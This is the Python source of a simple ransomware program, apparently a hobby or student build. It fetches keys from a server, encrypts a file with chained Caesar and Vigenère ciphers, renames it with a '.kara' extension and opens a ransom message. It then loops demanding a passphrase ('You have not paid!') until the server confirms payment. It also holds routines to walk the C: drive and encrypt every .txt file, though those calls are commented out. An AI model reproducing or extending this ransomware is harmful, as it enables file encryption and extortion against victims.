from caesar import *
from vigenere import *
from reverse import *
import sys
from sys import platform
import os
import winsound
import random, string
import webbrowser
import re
import win32api

import urllib
import urllib2
globalkey = ""
cskey = ""
vigkey = ""
msg1 = ""
correct = 'false'

msg2 = ""

data1 = ""


def contactServer(IDofMachine,Pass,Purpose):
	#params = {'ID': IDofMachine}


	params = {'ID': IDofMachine, 'Password': Pass, 'Purpose' : Purpose}

	port = ':8080'

	req = urllib2.Request("http://127.0.0.1:8080", urllib.urlencode(params))
	res = urllib2.urlopen(req)


	response = res.read()

	return response









	







#rootdir = 'C:/Users/sid/Desktop/test'
def traverseCDrive(rootdir):


	for subdir, dirs, files in os.walk(rootdir):
	    for file in files:
	    	if file.endswith(".txt"):
	    		pathofile = os.path.join(subdir,file)
	    		print os.path.join(subdir, file)
	    		encryptFiles(pathofile)



def decryptCDrive(rootdir):


	for subdir, dirs, files in os.walk(rootdir):
	    for file in files:
	    	if file.endswith(".kara"):
	    		pathofile = os.path.join(subdir,file)
	    		print os.path.join(subdir, file)
	    		decryptFiles(pathofile)




def generateID():
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(10))




	






	      


def encrypt1File(CeasarKey,VigenereKey):

	list1 = []

	#list2 = []

	#list3 = []

	data = open(sys.argv[1],'rb')


	test = data.read()

	data.close()


	test1 = map(ord,test)

	



	

	results = caesartranslate(test1,CeasarKey,'encrypt')

	resultsmap = map(ord,results)

	results2 = encryptMessage(VigenereKey,resultsmap)

	


	results3 = reverse(results2)


	



	





	


	oufile = open(sys.argv[1],'wb')


	oufile.write(''.join(results3))

	oufile.close()

	base = os.path.splitext(sys.argv[1])[0]
	
	os.rename(sys.argv[1],sys.argv[1] + ".kara")

	winsound.PlaySound('notif_mp3.wav', winsound.SND_FILENAME)










	
   

	

def decrypt1File(CeasarKey,VigenereKey,filename):

	list1 = []

	#list2 = []

	#list3 = []




	

	data = open(filename,'rb')

	


	test = data.read()

	

	data.close()

	

	


	results3 = reverse(test)

	results3map = map(ord,results3)
	#
	results4 = decryptMessage(VigenereKey,results3map)

	results4map = map(ord,results4)


	results5 = caesartranslate(results4map,CeasarKey,'decrypt')

	
	


	
	oufile1 = open(filename,'wb')

	oufile1.write(results5)

	oufile1.close()


	base = os.path.splitext(filename)[0]
	os.rename(filename,base)







	



	




	





def main():


	


	#traverseMachine()
	machineID = generateID()
	

	data1 = contactServer(machineID,"null","Encryption")
	

	globalkey = data1

	

	
	

	cskey = int(globalkey[0])


	

	

	

	vigkey = globalkey[1:len(globalkey)]

	



	#traverseCDrive("C:/")




	encrypt1File(cskey,vigkey)
	messageToDisplay = 'message.html'
	webbrowser.open_new_tab(messageToDisplay)

	global correct

	while correct == 'false':

		


		 

		password = raw_input("Enter in your personal passphrase:")

		checker = contactServer(machineID,password,"Check")
		if checker == 'False':
			print "You have not paid! You'd better hurry or you'll be left dismayed!"

		elif checker == 'True':
			name = raw_input("TEST: Enter filename to decrypt")
			print "decrypting files"
			decryptionKeys = contactServer(machineID,"null","Decryption");
			caesarDecKey = int(decryptionKeys[0])
			vigenereDecKey = decryptionKeys[1:len(decryptionKeys)]
			


			decrypt1File(caesarDecKey,vigenereDecKey,name);
			print "Your now regained control of your personal data.)"
			correct = 'True'




	
	
	

	


	


	


	

	


	


    # Windows...

if platform == "win32":
	main()




















